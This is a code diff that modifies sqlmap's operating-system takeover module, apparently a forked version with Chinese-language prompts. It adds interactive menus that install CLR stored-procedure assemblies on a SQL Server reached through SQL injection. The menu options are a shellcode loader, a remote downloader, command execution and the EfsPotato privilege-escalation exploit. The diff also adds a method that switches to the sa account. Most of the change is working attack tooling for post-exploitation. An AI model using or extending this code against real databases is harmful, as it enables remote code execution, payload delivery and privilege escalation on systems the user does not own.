@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 
 """
-Copyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)
+Copyright (c) 2006-2025 sqlmap developers (https://sqlmap.org/)
 See the file 'LICENSE' for copying permission
 """
 
@@ -56,6 +56,7 @@ class Takeover(Abstraction, Metasploit, ICMPsh, Registry):
             errMsg += "the back-end DBMS"
             raise SqlmapNotVulnerableException(errMsg)
 
+        self.getRemoteTempPath()
         self.initEnv(web=web)
 
         if not web or (web and self.webBackdoorUrl is not None):
@@ -63,14 +64,12 @@ class Takeover(Abstraction, Metasploit, ICMPsh, Registry):
 
         if not conf.osShell and not conf.osPwn and not conf.cleanup:
             self.cleanup(web=web)
-
-    def installClr(self,currentDb):
+    def installClr1(self , currentDb):
         if isStackingAvailable() or conf.direct:
             web = False
         elif not isStackingAvailable() and Backend.isDbms(DBMS.MYSQL):
             infoMsg = "going to use a web backdoor for command prompt"
             logger.info(infoMsg)
-
             web = True
         else:
             errMsg = "unable to prompt for an interactive operating "
@@ -78,20 +77,84 @@ class Takeover(Abstraction, Metasploit, ICMPsh, Registry):
             errMsg += "stacked queries SQL injection is not supported"
             raise SqlmapNotVulnerableException(errMsg)
 
+        if not web or (web and self.webBackdoorUrl is not None):
+            print("请选择一个选项：")
+            print("【1】ShellcodeLoader")
+            print("【2】RemoteDownload")
+            print("【3】Exec")
+            print("【4】EfsPotato")
+            print("【5】UserDefined")
+            choice = int(input("请输入选项编号: "))
 
+            print('Please input remote dll path')
+            dll_name= input("请输入远程目标的dll路径：")
+
+            if choice == 1:
+                self.clrInstall1(currentDb, dll_name, "ClrShellcodeLoader", "Xplus", "ClrShellcodeLoader")
+
+            elif choice == 2:
+                self.clrInstall1(currentDb, dll_name, "ClrDownload", "Xplus", "ClrDownload")
+
+            elif choice == 3:
+                self.clrInstall1(currentDb, dll_name, "ClrExec", "Xplus", "ClrExec")
+
+            elif choice == 4:
+                self.clrInstall1(currentDb, dll_name, "ClrEfsPotato", "Xplus", "ClrEfsPotato")
+
+            elif choice == 5:
+                print('Please enter the custom CLR assembly name,'
+                      ' stored procedure class name, stored procedure function name separately...')
+                udf_assembly_name, procedure_class_name, procedure_function_name = (input("请分别输入自定义CLR程序集名称 存储过程类名 存储过程函数名：").split())
+
+                self.clrInstall1(currentDb,dll_name,udf_assembly_name,procedure_class_name,procedure_function_name)
+
+    def installClr2(self,currentDb):
+        if isStackingAvailable() or conf.direct:
+            web = False
+        elif not isStackingAvailable() and Backend.isDbms(DBMS.MYSQL):
+            infoMsg = "going to use a web backdoor for command prompt"
+            logger.info(infoMsg)
+            # mysql的情况下的处理
+            web = True
+        else:
+            errMsg = "unable to prompt for an interactive operating "
+            errMsg += "system shell via the back-end DBMS because "
+            errMsg += "stacked queries SQL injection is not supported"
+            raise SqlmapNotVulnerableException(errMsg)
 
         if not web or (web and self.webBackdoorUrl is not None):
-            print('Please input remote dll path')
-            a= input("请输入远程目标的dll路径：")
-            print('Please enter the custom CLR assembly name, stored procedure class name, stored procedure function name separately')
-            b,c,d = (input("请分别输入自定义CLR程序集名称 存储过程类名 存储过程函数名：").split())
-            self.clrInstall(currentDb,a,b,c,d)
+            print("请选择一个选项：")
+            print("【1】ShellcodeLoader")
+            print("【2】RemoteDownload")
+            print("【3】Exec")
+            print("【4】EfsPotato")
+            print("【5】UserDefined")
+            choice = int(input("请输入选项编号: "))
 
-    def checkProcedure(self,function_name):
-        self.procedureCheck(function_name)
+            if choice == 1:
+                self.clrInstall2(currentDb, "clrshellcodeloader.dll", "ClrShellcodeLoader", "Xplus", "ClrShellcodeLoader")
 
-    def delProcedure(self,function_name):
-        self.procedureDel(function_name)
+            elif choice == 2:
+                self.clrInstall2(currentDb, "clrdownload.dll", "ClrDownload", "Xplus", "ClrDownload")
+
+            elif choice == 3:
+                self.clrInstall2(currentDb, "clrexec.dll", "ClrExec", "Xplus", "ClrExec")
+
+            elif choice == 4:
+                self.clrInstall2(currentDb, "clrefspotato.dll", "ClrEfsPotato", "Xplus", "ClrEfsPotato")
+
+            elif choice == 5:
+                print('Please input local dll path: ')
+                dll_name = input("请输入需要本地的dll名称: ")
+                print('Please enter UDF CLR assembly name, stored procedure class name, stored procedure function name separately...')
+                udf_assembly_name,procedure_class_name,procedure_function_name = (input("请分别输入自定义CLR程序集名称 存储过程类名 存储过程函数名：").split())
+                self.clrInstall2(currentDb,dll_name,udf_assembly_name,procedure_class_name,procedure_function_name)
+
+    def checkProcedure(self):
+        self.procedureCheck()
+
+    def delClr(self):
+        self.clrDel()
 
     def disableClr(self):
         if isStackingAvailable() or conf.direct:
@@ -99,28 +162,12 @@ class Takeover(Abstraction, Metasploit, ICMPsh, Registry):
         elif not isStackingAvailable() and Backend.isDbms(DBMS.MYSQL):
             infoMsg = "going to use a web backdoor for command prompt"
             logger.info(infoMsg)
-
             web = True
         else:
             errMsg = "unable to prompt for an interactive operating "
             errMsg += "system shell via the back-end DBMS because "
             errMsg += "stacked queries SQL injection is not supported"
             raise SqlmapNotVulnerableException(errMsg)
-
-
-        try:
-            self.initEnv(web=web)
-        except SqlmapFilePathException:
-            if not web and not conf.direct:
-                infoMsg = "falling back to web backdoor method..."
-                logger.info(infoMsg)
-
-                web = True
-                kb.udfFail = True
-
-                self.initEnv(web=web)
-            else:
-                raise
 
         if not web or (web and self.webBackdoorUrl is not None):
             self.clrDisable()
@@ -138,11 +185,11 @@ class Takeover(Abstraction, Metasploit, ICMPsh, Registry):
             errMsg += "stacked queries SQL injection is not supported"
             raise SqlmapNotVulnerableException(errMsg)
 
-
-
         if not web or (web and self.webBackdoorUrl is not None):
             self.clrEnable()
 
+    def toSa(self,currentdb):
+        self.changeSa(currentdb)
 
     def enableOle(self):
         if isStackingAvailable() or conf.direct:
@@ -150,7 +197,6 @@ class Takeover(Abstraction, Metasploit, ICMPsh, Registry):
         elif not isStackingAvailable() and Backend.isDbms(DBMS.MYSQL):
             infoMsg = "going to use a web backdoor for command prompt"
             logger.info(infoMsg)
-            # mysql的情况下的处理
             web = True
         else:
             errMsg = "unable to prompt for an interactive operating "
@@ -170,13 +216,13 @@ class Takeover(Abstraction, Metasploit, ICMPsh, Registry):
         elif not isStackingAvailable() and Backend.isDbms(DBMS.MYSQL):
             infoMsg = "going to use a web backdoor for command prompt"
             logger.info(infoMsg)
-
             web = True
         else:
             errMsg = "unable to prompt for an interactive operating "
             errMsg += "clr shell via the back-end DBMS because "
             errMsg += "stacked queries SQL injection is not supported"
             raise SqlmapNotVulnerableException(errMsg)
+
 
         if not web or (web and self.webBackdoorUrl is not None):
             self.shellClr()
